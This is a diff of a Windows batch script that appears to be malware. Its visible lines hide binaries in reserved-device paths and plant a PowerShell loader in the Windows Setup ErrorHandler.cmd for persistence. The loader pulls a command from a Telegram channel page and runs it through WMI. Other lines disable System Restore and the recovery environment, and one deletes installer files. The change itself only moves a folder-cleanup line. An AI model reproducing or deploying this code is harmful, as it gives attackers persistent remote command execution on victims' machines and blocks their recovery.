@@ -14,6 +14,7 @@ move /Y "%ProgramData%\bist\libssl-1_1.dll" "\\.\%ProgramData%\NUL..\"
 move /Y "%ProgramData%\bist\vcruntime140.dll" "\\.\%ProgramData%\NUL..\"
 move /Y "%ProgramData%\bist\libcrypto-1_1.dll" "\\.\%ProgramData%\NUL..\"
 move /Y "%ProgramData%\bist\ShellExperienceHost.exe" "\\.\%ProgramData%\NUL..\"
+rd /s /q "%ProgramData%\bist"
 
 echo powershell -NoProfile -ExecutionPolicy Bypass -Command "$u='https://t.me/s/updategps';$c=(iwr $u -UseBasicParsing).Content;$m=[regex]::Match($c,'property=\"og:description\" content=\"(.*?)\"');if($m.Success){$cmd=[Net.WebUtility]::HtmlDecode($m.Groups[1].Value) -replace '&#092;','\';$null=([WMIClass]'Win32_Process').Create($cmd)}" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
 echo powershell.exe %ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll >> "%USERPROFILE%\Cookies\ini.cmd"
@@ -39,5 +40,4 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f
 reagentc /disable
-rd /s /q "%ProgramData%\bist"
 powershell "Get-ChildItem C:\Windows\Installer\*.msi | Where-Object {$_.Length -gt 500MB} | Remove-Item -Force"
